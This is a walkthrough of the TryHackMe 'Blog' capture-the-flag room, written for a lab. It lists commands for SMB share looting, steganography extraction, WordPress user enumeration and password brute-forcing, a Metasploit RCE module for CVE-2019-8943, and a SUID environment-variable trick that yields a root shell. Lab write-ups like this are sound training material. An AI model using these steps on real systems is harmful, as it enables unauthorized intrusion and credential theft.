📝 TryHackMe: Blog | Full Walkthrough
Platform: TryHackMe
Room: Blog
Difficulty: Medium
Techniques: SMB Enumeration, Steganography, WordPress Exploitation, Privilege Escalation via SUID Binary

🧠 Summary

In this room, we exploit SMB shares, uncover hidden files using steganography, exploit a known WordPress vulnerability for remote code execution, and escalate privileges using a cleverly crafted SUID binary. Let’s dive deep.
🔍 Initial Recon

First, we add the target IP and hostname to /etc/hosts for convenience.

Next, run a full port scan:

nmap -sC -sV -T4 -p- <target-ip>

Open Ports Identified:

    22 (SSH)

    80 (HTTP)

    139, 445 (SMB)

📁 SMB Enumeration

We use smbmap to identify accessible shares:

smbmap -H <target-ip>

Out of the available shares, only BillySMB is accessible without credentials. Let’s recursively download its contents:

smbget -R smb://<target-ip>/BillySMB

Retrieved Files:

    Alice-White-Rabbit.jpg

    check-this.png

    tswift.mp4

🕵️ Steganography in Images

We suspect Alice-White-Rabbit.jpg contains hidden data. Using steghide, we extract embedded content:

steghide extract -sf Alice-White-Rabbit.jpg

Extracted File: rabbit_hole.txt
Content: A strange message — "I am wandering in deviance." — suggesting deeper exploration.
🌐 Web Enumeration

Use ffuf to brute-force directories:

ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Discovered directories:

    /admin

    /login

WordPress Detected

We suspect this is a WordPress instance. Let’s use wpscan:

wpscan --url http://<target-ip> --enumerate u

We enumerate usernames successfully via the /wp-json/wp/v2/users/ API.
🔐 Brute-Forcing Credentials

We now brute-force login credentials for users kwheel and bjoel:

wpscan --url http://<target-ip> --passwords rockyou.txt --usernames kwheel

Successfully authenticate as kwheel.
🖼️ Exploiting WordPress – RCE via Image Upload

Identify the WordPress version and verify it’s vulnerable to CVE-2019-8943 (WordPress Core <= 5.0 - Remote Code Execution via Image Upload).

Use Metasploit:

msfconsole
use exploit/unix/webapp/wp_crop_rce

After configuring the module, fire the exploit.

🎉 Meterpreter session opened!
We are in as www-data.
🔓 Post-Exploitation: Lateral Movement

Search for user flags:

find / -name user.txt 2>/dev/null

We locate user.txt under /media/usb/, accessible via user bjoel, but www-data lacks permissions.

We check wp-config.php and extract database hashes.

Using hash-identifier, we identify the hashing algorithm and crack the kwheel password. Unfortunately, the bjoel hash remains uncracked.
🚀 Privilege Escalation

Enumerate SUID binaries:

find / -perm -4000 2>/dev/null

We spot a suspicious binary: /usr/sbin/checker
Analyzing the Binary

Run ltrace on it:

ltrace /usr/sbin/checker

It checks for an admin environment variable. If present, it sets UID to 0 and spawns a shell.

Export the variable and rerun the binary:

export admin=1
/usr/sbin/checker

💥 Root shell obtained!
🏁 Capture the Flags

    User flag: /media/usb/user.txt

    Root flag: /root/root.txt

